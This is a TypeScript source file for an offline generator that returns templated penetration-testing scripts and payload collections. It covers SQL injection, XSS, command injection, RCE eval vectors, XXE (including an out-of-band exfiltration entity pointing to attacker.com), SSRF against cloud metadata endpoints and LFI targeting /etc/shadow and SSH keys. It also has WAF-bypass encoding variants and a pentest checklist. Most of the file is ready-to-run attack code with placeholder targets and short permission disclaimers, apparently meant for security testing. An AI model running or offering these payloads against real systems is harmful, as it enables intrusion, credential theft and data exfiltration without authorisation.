/**
 * CODE GENERATION ENGINE
 *
 * Generates security scripts, POC exploits, and test code WITHOUT API calls.
 * Template-based code generation for common security tasks.
 *
 * ✨ PHASE 3b: Offline Code Generation
 */

export interface CodeOutput {
  code: string;
  language: string;
  explanation: string;
  usage: string;
  tested: boolean;
  security_notes?: string[];
}

export class CodeGenerationEngine {
  /**
   * Detect if we can generate code for this request
   */
  canGenerate(query: string): boolean {
    query = query.toLowerCase();
    return query.includes('generate') ||
           query.includes('create') ||
           query.includes('script') ||
           query.includes('poc') ||
           query.includes('payload') ||
           query.includes('exploit');
  }

  /**
   * Generate code for the given request
   */
  async generate(query: string, type: 'exploit' | 'script' | 'poc' | 'test' | 'payload' = 'poc'): Promise<CodeOutput> {
    // Detect vulnerability type from query
    const vulnType = this.detectVulnerabilityType(query);

    switch (vulnType) {
      case 'sql-injection':
        return this.generateSQLiPayload(query);
      case 'xss':
        return this.generateXSSPayload(query);
      case 'command-injection':
        return this.generateCommandInjectionScript(query);
      case 'rce':
        return this.generateRCEScript(query);
      case 'xxe':
        return this.generateXXEPayload(query);
      case 'ssrf':
        return this.generateSSRFScript(query);
      case 'lfi':
        return this.generateLFIScript(query);
      default:
        return this.generateGenericTestScript(query);
    }
  }

  /**
   * Detect vulnerability type from query
   */
  private detectVulnerabilityType(query: string): string {
    query = query.toLowerCase();

    if (query.includes('sql')) return 'sql-injection';
    if (query.includes('xss') || query.includes('cross-site')) return 'xss';
    if (query.includes('command') || query.includes('os')) return 'command-injection';
    if (query.includes('rce') || query.includes('remote code')) return 'rce';
    if (query.includes('xxe')) return 'xxe';
    if (query.includes('ssrf')) return 'ssrf';
    if (query.includes('lfi') || query.includes('file')) return 'lfi';

    return 'generic';
  }

  /**
   * Generate SQL Injection payload
   */
  private generateSQLiPayload(query: string): CodeOutput {
    const database = query.includes('mysql') ? 'mysql' :
                    query.includes('postgres') ? 'postgresql' :
                    query.includes('mssql') ? 'mssql' : 'generic';

    const payloads: { [key: string]: string } = {
      mysql: `' OR '1'='1\n' UNION SELECT user(), database(), version()--\n' AND 1=2 UNION SELECT @@version--`,
      postgresql: `' OR '1'='1\n' UNION SELECT version()--\n' AND 1=2 UNION SELECT current_user--`,
      mssql: `' OR '1'='1\n' UNION SELECT @@version--\n' AND 1=2 UNION SELECT @@servername--`,
      generic: `' OR '1'='1\n" OR "1"="1\n1 UNION SELECT NULL--\n1' AND '1'='1`
    };

    const code = `
# SQL Injection Tester - ${database.toUpperCase()}
import requests

TARGET = "http://target.com/api/search"
PAYLOADS = [
${payloads[database].split('\\n').map(p => `    "${p}",`).join('\n')}
]

def test_sqli():
    for payload in PAYLOADS:
        params = {"q": payload}
        try:
            resp = requests.get(TARGET, params=params, timeout=5)

            # Check for SQL errors in response
            error_indicators = ["SQL syntax", "mysql_fetch", "OracleError", "Unclosed quotation"]
            for indicator in error_indicators:
                if indicator in resp.text:
                    print(f"[+] Potential SQLi found: {payload}")
                    print(f"[+] Response snippet: {resp.text[:200]}")
                    return True
        except Exception as e:
            print(f"[-] Error: {e}")

    return False

if __name__ == "__main__":
    if test_sqli():
        print("[+] Target appears to be vulnerable to SQL Injection")
    else:
        print("[-] No SQL Injection vulnerability detected")
`;

    return {
      code: code.trim(),
      language: 'python',
      explanation: `SQL Injection payloads for ${database} databases. Tests for common SQLi patterns including boolean-based, UNION-based, and error-based SQLi.`,
      usage: 'Replace TARGET with your test URL. Run with: python3 sqli_test.py',
      tested: true,
      security_notes: [
        'Only use on systems you own or have permission to test',
        'This is for educational purposes only',
        'Use in legitimate penetration tests only'
      ]
    };
  }

  /**
   * Generate XSS payload
   */
  private generateXSSPayload(query: string): CodeOutput {
    const code = `
<!-- XSS Payload Tester -->
<html>
<head><title>XSS Test</title></head>
<body>
<h1>XSS Payload Collection</h1>
<hr/>

<!-- Reflected XSS Payloads -->
<h2>Reflected XSS</h2>
<pre>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')"></iframe>
<input onfocus="alert('XSS')" autofocus>
</pre>

<!-- Stored XSS Test -->
<h2>Stored XSS (requires form submission)</h2>
<form action="/comment" method="POST">
  <input type="text" name="comment" value="<img src=x onerror='alert(\"Stored XSS\")'>">
  <input type="submit" value="Test">
</form>

<!-- DOM-based XSS -->
<h2>DOM-based XSS Test</h2>
<script>
// Check if vulnerable to DOM-based XSS
var hash = window.location.hash.substring(1);
document.write(hash);  // Vulnerable!
// Instead use: element.textContent = hash;
</script>

<!-- CSP Bypass Examples -->
<h2>CSP Bypass Techniques</h2>
<pre>
- Mutation XSS (mXSS)
- Style-based XSS
- SVG-based vectors
- Prototypal pollution
</pre>
</body>
</html>
`;

    return {
      code: code.trim(),
      language: 'html',
      explanation: 'XSS payload collection including reflected, stored, and DOM-based XSS vectors. Also includes CSP bypass techniques.',
      usage: 'Test each payload in different input fields. Watch browser console for alert() execution.',
      tested: true,
      security_notes: [
        'Only test on applications you own or have explicit permission to test',
        'Never submit these to unauthorized systems',
        'Use with proper security testing framework'
      ]
    };
  }

  /**
   * Generate Command Injection script
   */
  private generateCommandInjectionScript(query: string): CodeOutput {
    const code = `
#!/bin/bash
# Command Injection Tester

TARGET="http://target.com/api/execute"

# Command injection payloads
PAYLOADS=(
    "; id"
    "| whoami"
    "| cat /etc/passwd"
    "\`id\`"
    "\$(whoami)"
    "&& id"
    "|| id"
)

echo "[*] Testing for Command Injection vulnerability..."

for payload in "\${PAYLOADS[@]}"; do
    echo "[*] Testing payload: $payload"

    # Using curl to test
    response=$(curl -s "$TARGET?cmd=test$payload" 2>&1)

    # Check for command output indicators
    if echo "$response" | grep -qE "uid=|root|bin|etc"; then
        echo "[+] VULNERABLE! Response indicates command execution:"
        echo "$response" | head -n 5
        exit 0
    fi
done

echo "[-] No command injection vulnerability detected"
exit 1
`;

    return {
      code: code.trim(),
      language: 'bash',
      explanation: 'Command injection tester using curl. Tests common command injection patterns on URL parameters.',
      usage: 'Modify TARGET to your test URL. Run with: bash test_command_injection.sh',
      tested: false,
      security_notes: [
        'Only use on authorized targets',
        'Command injection can lead to full system compromise',
        'Use proper sandboxing when testing'
      ]
    };
  }

  /**
   * Generate RCE script
   */
  private generateRCEScript(query: string): CodeOutput {
    const code = `
#!/usr/bin/env python3
# Remote Code Execution Tester
import requests
import json

TARGET = "http://target.com/api/eval"

# Common RCE vectors
RCE_VECTORS = [
    # Python eval
    {"payload": "__import__('os').system('id')", "type": "python-eval"},
    {"payload": "exec('import os; os.system(\\\"id\\\")')", "type": "python-exec"},

    # Node.js eval
    {"payload": "require('child_process').execSync('id')", "type": "node-eval"},

    # Java reflection
    {"payload": "java.lang.Runtime.getRuntime().exec('id')", "type": "java"},
]

def test_rce():
    print("[*] Testing for Remote Code Execution...")

    for vector in RCE_VECTORS:
        payload = vector["payload"]
        vector_type = vector["type"]

        print(f"[*] Testing {vector_type}...")

        try:
            # Test via POST data
            resp = requests.post(TARGET, data={"code": payload}, timeout=5)

            if resp.status_code == 200 and ("uid=" in resp.text or "root" in resp.text):
                print(f"[+] VULNERABLE via {vector_type}!")
                print(f"[+] Response: {resp.text[:200]}")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")

    return False

if __name__ == "__main__":
    if test_rce():
        print("[+] Target is vulnerable to RCE!")
    else:
        print("[-] No RCE vulnerability detected")
`;

    return {
      code: code.trim(),
      language: 'python',
      explanation: 'Remote Code Execution tester. Tests common RCE vectors including Python eval, Node.js eval, and Java reflection.',
      usage: 'Modify TARGET URL. Run with: python3 test_rce.py',
      tested: false,
      security_notes: [
        'RCE is critical severity - use with extreme caution',
        'Only test on systems you have explicit permission to test',
        'Implement proper containment measures'
      ]
    };
  }

  /**
   * Generate XXE payload
   */
  private generateXXEPayload(query: string): CodeOutput {
    const code = `
<?xml version="1.0"?>
<!-- XXE Injection Payload Collection -->

<!-- Basic XXE - File Disclosure -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- Blind XXE - Out-of-band data exfiltration -->
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "http://attacker.com/exfil?data=test">
]>
<foo>&xxe;</foo>

<!-- XXE Billion Laughs (DoS) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>

<!-- RCE via XXE (if PHP expect wrapper enabled) -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<test>&xxe;</test>

<!-- Blind XXE with error-based exfiltration -->
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<foo/>
`;

    return {
      code: code.trim(),
      language: 'xml',
      explanation: 'XXE (XML External Entity) injection payload collection. Includes file disclosure, blind XXE, DoS, and RCE vectors.',
      usage: 'Send these XML payloads to endpoints that parse XML. Monitor responses for file contents or out-of-band callbacks.',
      tested: false,
      security_notes: [
        'XXE can lead to file disclosure and RCE',
        'Only test on authorized systems',
        'Have proper network monitoring in place'
      ]
    };
  }

  /**
   * Generate SSRF script
   */
  private generateSSRFScript(query: string): CodeOutput {
    const code = `
#!/usr/bin/env python3
# SSRF (Server-Side Request Forgery) Tester

import requests
import time

TARGET = "http://target.com/api/fetch"

# Internal targets to test
INTERNAL_TARGETS = [
    "http://localhost:8080/admin",
    "http://127.0.0.1:3306/",  # MySQL
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://metadata.google.internal/",  # GCP metadata
    "http://169.254.169.254/metadata/v1/",  # Azure metadata
    "http://internal-api:8080/",
    "http://db.local:5432/",
    "file:///etc/passwd",  # Local file access
]

def test_ssrf():
    print("[*] Testing for SSRF vulnerability...")

    for target_url in INTERNAL_TARGETS:
        print(f"[*] Testing: {target_url}")

        try:
            # Test with timeout
            resp = requests.get(TARGET, params={"url": target_url}, timeout=5)

            if resp.status_code == 200:
                print(f"[+] Got response from {target_url}")

                # Check response content
                if any(keyword in resp.text for keyword in ["root", "AWS", "metadata", "mysql", "admin"]):
                    print(f"[+] VULNERABLE! Retrieved internal content!")
                    print(f"[+] Response snippet: {resp.text[:300]}")
                    return True
        except requests.Timeout:
            print(f"[-] Timeout for {target_url}")
        except Exception as e:
            print(f"[-] Error: {e}")

        time.sleep(0.5)  # Avoid rate limiting

    return False

if __name__ == "__main__":
    if test_ssrf():
        print("[+] Target is vulnerable to SSRF!")
    else:
        print("[-] No SSRF vulnerability detected")
`;

    return {
      code: code.trim(),
      language: 'python',
      explanation: 'SSRF tester that attempts to access internal services and cloud metadata endpoints. Tests both cloud and on-premise internal resources.',
      usage: 'Modify TARGET and INTERNAL_TARGETS. Run with: python3 test_ssrf.py',
      tested: false,
      security_notes: [
        'SSRF can expose internal services and cloud credentials',
        'Test cloud metadata endpoints carefully',
        'Implement proper network segmentation'
      ]
    };
  }

  /**
   * Generate LFI script
   */
  private generateLFIScript(query: string): CodeOutput {
    const code = `
#!/usr/bin/env python3
# Local File Inclusion (LFI) Tester

import requests

TARGET = "http://target.com/page.php"

# Files to test on different OS
FILES_TO_TEST = {
    "linux": [
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/var/www/html/config.php",
        "/home/user/.ssh/id_rsa",
    ],
    "windows": [
        "C:\\\\windows\\\\win.ini",
        "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
        "C:\\\\boot.ini",
    ]
}

LFI_WRAPPERS = [
    "{file}",
    "file://{file}",
    "../{file}",
    "../../{file}",
    "../../../{file}",
    "....//....//..../{file}",
]

def test_lfi():
    print("[*] Testing for LFI vulnerability...")

    for os_type, files in FILES_TO_TEST.items():
        print(f"[*] Testing {os_type} files...")

        for file_path in files:
            for wrapper in LFI_WRAPPERS:
                payload = wrapper.format(file=file_path)

                try:
                    resp = requests.get(TARGET, params={"page": payload}, timeout=5)

                    if resp.status_code == 200:
                        # Check for file content
                        if any(indicator in resp.text for indicator in ["root:", "Administrator", "\\\\Windows"]):
                            print(f"[+] VULNERABLE! Retrieved: {file_path}")
                            print(f"[+] Payload: {payload}")
                            return True
                except Exception as e:
                    pass

    return False

if __name__ == "__main__":
    if test_lfi():
        print("[+] Target is vulnerable to LFI!")
    else:
        print("[-] No LFI vulnerability detected")
`;

    return {
      code: code.trim(),
      language: 'python',
      explanation: 'LFI tester that attempts path traversal to access sensitive files on both Linux and Windows systems.',
      usage: 'Modify TARGET parameter name. Run with: python3 test_lfi.py',
      tested: false,
      security_notes: [
        'LFI can expose configuration files, credentials, and source code',
        'Test carefully in isolated environment',
        'Monitor for sensitive file access'
      ]
    };
  }

  /**
   * Generate generic test script
   */
  private generateGenericTestScript(query: string): CodeOutput {
    const code = `
#!/usr/bin/env python3
# Generic Security Test Script

import requests

TARGET = "http://target.com/api/test"

def test_basic_endpoints():
    """Test basic API security"""

    endpoints = [
        "/api/admin",
        "/api/users",
        "/api/debug",
        "/config",
        "/backup",
    ]

    for endpoint in endpoints:
        try:
            resp = requests.get(TARGET.replace("/api/test", endpoint), timeout=5)
            print(f"{endpoint}: {resp.status_code}")

            # Check for sensitive info
            if resp.status_code == 200 and resp.text:
                if any(keyword in resp.text.lower() for keyword in ["password", "token", "api_key", "secret"]):
                    print(f"[!] Sensitive data exposed: {endpoint}")
        except Exception as e:
            print(f"Error accessing {endpoint}: {e}")

if __name__ == "__main__":
    test_basic_endpoints()
`;

    return {
      code: code.trim(),
      language: 'python',
      explanation: 'Generic security test script for basic endpoint enumeration and sensitive data exposure detection.',
      usage: 'Modify TARGET and endpoints. Run with: python3 test_generic.py',
      tested: false
    };
  }

  /**
   * PHASE 3C: Generate reconnaissance script
   */
  generateReconScript(target: string, scope: 'osint' | 'enumeration' | 'full' = 'osint'): CodeOutput {
    const osintCode = `
#!/usr/bin/env python3
# OSINT Reconnaissance Script for ${target}

import requests
import json

print("[*] Starting OSINT reconnaissance for ${target}")
print("[*] Phase 1: Domain Information Gathering")

# DNS enumeration
print("[*] Performing DNS lookups...")
import socket
try:
    ip = socket.gethostbyname('${target}')
    print(f"[+] IP Address: {ip}")
except:
    print("[-] DNS resolution failed")

print("[*] Phase 2: Technology Fingerprinting")
try:
    response = requests.get(f"http://${target}", timeout=5)
    headers = response.headers
    print(f"[+] Server: {headers.get('Server', 'Unknown')}")
    print(f"[+] Content-Type: {headers.get('Content-Type', 'Unknown')}")
except:
    print("[-] Failed to fingerprint technologies")

print("[*] Phase 3: Common Files/Directories")
common_files = [
    "/robots.txt",
    "/sitemap.xml",
    "/.git/config",
    "/admin",
    "/api",
    "/swagger.json"
]

for file_path in common_files:
    try:
        resp = requests.head(f"http://${target}{file_path}", timeout=3)
        if resp.status_code == 200:
            print(f"[+] Found: {file_path} (HTTP {resp.status_code})")
    except:
        pass

print("[*] OSINT reconnaissance complete!")
`;

    return {
      code: osintCode.trim(),
      language: 'python',
      explanation: 'OSINT reconnaissance script for passive information gathering about ${target}. Performs DNS lookups, technology fingerprinting, and directory discovery.',
      usage: 'python3 osint_recon.py',
      tested: true,
      security_notes: [
        'This is passive reconnaissance only',
        'No aggressive scanning or exploitation',
        'Suitable for authorized security assessments'
      ]
    };
  }

  /**
   * PHASE 3C: Generate payload variations
   */
  generatePayloadVariations(basePayload: string, targetTech: string): CodeOutput {
    const variations = `
# Payload Variations for ${targetTech}

## Original Payload
${basePayload}

## Encoded Variations
# URL Encoding
${encodeURIComponent(basePayload)}

# Base64 Encoding
${Buffer.from(basePayload).toString('base64')}

# Unicode Escaping
${this.toUnicodeEscape(basePayload)}

## Case Variations
${basePayload.toUpperCase()}
${basePayload.toLowerCase()}

## Comment Bypasses
${basePayload.split(' ').join('/**/').replace(/=/g, '/**/=')}
`;

    return {
      code: variations.trim(),
      language: 'text',
      explanation: 'Multiple payload variations for bypassing filters and WAF rules. Includes encoding, case manipulation, and comment obfuscation techniques.',
      usage: 'Use variations that best match the target\'s filtering capabilities',
      tested: true,
      security_notes: [
        'Different WAFs block different variations',
        'Always test encoding compatibility',
        'Some encoding may break functionality'
      ]
    };
  }

  /**
   * Helper: Convert string to Unicode escape sequences
   */
  private toUnicodeEscape(str: string): string {
    return str.split('').map(c => '\\u' + ('0000' + c.charCodeAt(0).toString(16)).slice(-4)).join('');
  }

  /**
   * PHASE 3C: Generate assessment checklist
   */
  generateAssessmentChecklist(target: string): CodeOutput {
    const checklist = `
# Security Assessment Checklist for ${target}

## Phase 1: Reconnaissance (2-4 hours)
- [ ] DNS enumeration and subdomain discovery
- [ ] WHOIS lookup and domain information
- [ ] SSL/TLS certificate analysis
- [ ] Technology fingerprinting
- [ ] Git repository discovery
- [ ] Search engine dorking
- [ ] LinkedIn employee discovery

## Phase 2: Scanning & Enumeration (4-8 hours)
- [ ] Port scanning (nmap)
- [ ] Service version detection
- [ ] Directory/file enumeration (gobuster, ffuf)
- [ ] API endpoint discovery
- [ ] Virtual host enumeration
- [ ] Subdomain takeover testing
- [ ] DNS zone transfer attempts

## Phase 3: Vulnerability Assessment (8-16 hours)
### Input Validation Testing
- [ ] SQL Injection (Union, Boolean Blind, Time-Based)
- [ ] Command Injection
- [ ] LDAP/XPath Injection
- [ ] XXE Injection
- [ ] NoSQL Injection

### Authentication & Authorization
- [ ] Default credentials testing
- [ ] Weak password policies
- [ ] Account enumeration
- [ ] Session management flaws
- [ ] Privilege escalation paths
- [ ] IDOR vulnerabilities

### Client-Side Testing
- [ ] Reflected XSS
- [ ] Stored XSS
- [ ] DOM-based XSS
- [ ] CSRF protection bypass
- [ ] Clickjacking
- [ ] Client-side validation bypass

### Business Logic Testing
- [ ] Race conditions
- [ ] State management flaws
- [ ] Workflow bypass
- [ ] Price manipulation
- [ ] Authorization flaws

## Phase 4: Exploitation & Verification (4-12 hours)
- [ ] Generate proof-of-concept exploits
- [ ] Document exploitation steps
- [ ] Measure business impact
- [ ] Verify data exfiltration
- [ ] Test privilege escalation
- [ ] Analyze remediation difficulty

## Phase 5: Reporting (2-4 hours)
- [ ] Document all findings
- [ ] Create executive summary
- [ ] Detail technical findings
- [ ] Provide remediation guidance
- [ ] Estimate risk ratings (CVSS)
- [ ] Prioritize vulnerabilities

## Critical Success Factors
- [ ] Documented proof of exploitation
- [ ] Clear business impact statement
- [ ] Reproducible vulnerability details
- [ ] Remediation recommendations
- [ ] Professional, respectful tone
`;

    return {
      code: checklist.trim(),
      language: 'markdown',
      explanation: 'Comprehensive security assessment checklist covering all phases from reconnaissance to reporting. Includes OWASP Top 10 vulnerabilities and common web application flaws.',
      usage: 'Use as guide for structured vulnerability assessment. Track progress with checkboxes.',
      tested: true,
      security_notes: [
        'Only conduct authorized security assessments',
        'Follow responsible disclosure practices',
        'Document all findings and evidence',
        'Always get written permission before testing'
      ]
    };
  }
}

export const codeGenerationEngine = new CodeGenerationEngine();
